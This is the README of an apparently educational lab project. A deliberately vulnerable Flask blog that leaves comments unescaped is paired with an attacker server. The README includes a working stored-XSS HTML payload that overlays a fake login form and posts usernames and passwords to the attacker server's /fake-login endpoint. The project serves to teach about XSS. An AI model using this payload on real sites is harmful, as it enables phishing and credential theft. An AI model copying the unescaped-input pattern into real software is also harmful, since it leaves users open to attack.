# Cross-Site Scripting (XSS) Demonstration Project

## Overview

This project demonstrates the exploitation of a **Cross-Site Scripting (XSS)** vulnerability in a web application using **Flask**. It includes both a vulnerable victim application and an attacker server to simulate an XSS attack, including credential theft through a fake login page.

## Project Structure

``````bash
project-directory/
│
├── attacker_server/
│   ├── attacker_server.py    # Flask app for the attacker server
│   ├── Dockerfile            # Dockerfile for attacker server
│
├── victim_app/
│   ├── app.py                # Flask app for the victim application
│   ├── Dockerfile            # Dockerfile for victim application
│   ├── requirements.txt      # Python dependencies for victim app
│   ├── static/               # Static files (CSS, JS)
│   ├── templates/            # HTML templates
│
├── docker-compose.yml        # Docker Compose file to manage both containers


## Technologies Used
Flask: A lightweight Python web framework for the victim and attacker server applications.
SQLite: A lightweight database used in the victim application.
Docker: Containerizes the victim and attacker applications for easy setup and isolation.
Docker Compose: Used to orchestrate both services.
HTML/CSS: Used for front-end templating and styling.
Setup Instructions
Prerequisites
Docker: Install Docker and Docker Compose on your machine.
Git: Make sure Git is installed to clone the repository.
Steps to Run the Project
Clone the repository:

```bash
git clone https://github.com/naibwedi/Cross-Site-Scripting.git
cd Cross-Site-Scripting
```
Build and run the Docker containers:

```bash
docker-compose up
```
## Access the applications:

Victim Application: Open a browser and go to http://127.0.0.1:5000 to access the vulnerable victim app.
Attacker Server: The attacker server will be running at http://127.0.0.1:5001 where stolen credentials will be logged.
Stop the containers: To stop the running containers, press CTRL+C in the terminal or run:

```bash
docker-compose down
```

## Features
### Victim Application
A basic blog application where users can add posts and comments.
Vulnerability: The application does not escape user input in the blog post and comment sections, making it vulnerable to XSS attacks.

### Attacker Server
A Flask server designed to capture credentials via a fake login form.
Displays and logs stolen credentials from the victim’s browser to simulate credential theft.
Demonstration of XSS Vulnerability
Injecting Malicious Script: An attacker can submit a malicious comment with a script payload that injects a fake login form when viewed by another user.

Example payload:

```html
<div style="background-color: rgba(0, 0, 0, 0.95); position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; text-align: center; color: white; padding-top: 100px;">
    <h1>Please Log In Again</h1>
    <form method="POST" action="http://127.0.0.1:5001/fake-login">
        <input type="text" name="username" placeholder="Enter username">
        <input type="password" name="password" placeholder="Enter password">
        <button type="submit">Log In</button>
    </form>
</div>
```
Redirect to Attacker Server: This payload displays a fake login form, and when the user submits their credentials, they are sent to the attacker’s server (http://127.0.0.1:5001/fake-login).

Credential Theft: The attacker server captures the submitted credentials and logs them to the terminal.
